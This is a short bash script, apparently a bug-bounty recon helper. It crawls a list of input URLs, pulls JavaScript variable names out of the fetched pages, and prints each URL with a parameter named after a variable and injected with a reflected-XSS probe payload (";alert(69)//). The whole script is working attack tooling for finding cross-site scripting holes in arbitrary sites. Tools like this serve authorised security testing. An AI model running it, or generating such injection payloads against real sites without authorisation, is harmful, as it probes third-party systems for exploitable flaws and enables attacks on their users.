cat - > tmp
echo "====================== It's gonna be Legen... Wait for it ======================"
cat tmp | concurl -c 100 -d 10 &>/dev/null

#logger "[+] Extracting vars"
cd out
gf jsvar > tmp

while read line
do
	url=$(cat $(echo "$line" | cut -d: -f1) | head -1 | awk '{print $4}')

	varName=$(echo "$line" | awk '{print $2}' | cut -d= -f1)
	echo "$url?$varName=\";alert(69)//"
	#if [ $(echo $url | awk -F"/" '{print NF}') -lt 4 ]
	#then
	#	echo "$url/?$varName=\";alert(69)//"
	#else
	#	echo "$url?$varName=\";alert(69)//"
	#fi
done < tmp
cd .. && rm tmp && rm out -r
echo "====================== ..DARY! ======================"
